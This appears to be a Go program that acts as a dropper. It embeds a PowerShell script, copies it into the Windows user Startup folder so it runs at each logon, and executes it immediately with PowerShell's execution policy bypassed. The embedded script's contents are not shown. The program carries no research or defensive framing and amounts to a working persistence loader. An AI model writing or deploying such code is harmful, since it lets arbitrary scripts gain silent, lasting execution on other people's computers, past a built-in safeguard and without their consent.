package main

import (
	"bytes"
	_ "embed"
	"os"
	"os/exec"
	"path/filepath"
)

//go:embed script.ps1
var script []byte

func main() {
	startupFolderPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	scriptPath := filepath.Join(os.TempDir(), "script.ps1")

	// Copy the embedded script to the startup folder
	destPath := filepath.Join(startupFolderPath, "script.ps1")
	err := copyFile(scriptPath, destPath)
	if err != nil {
		panic(err)
	}

	// Run PowerShell with the copied script
	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", destPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		panic(err)
	}
}

func copyFile(srcPath, destPath string) error {
	destFile, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer destFile.Close()

	srcFile := bytes.NewReader(script)
	_, err = srcFile.WriteTo(destFile)
	if err != nil {
		return err
	}

	return nil
}
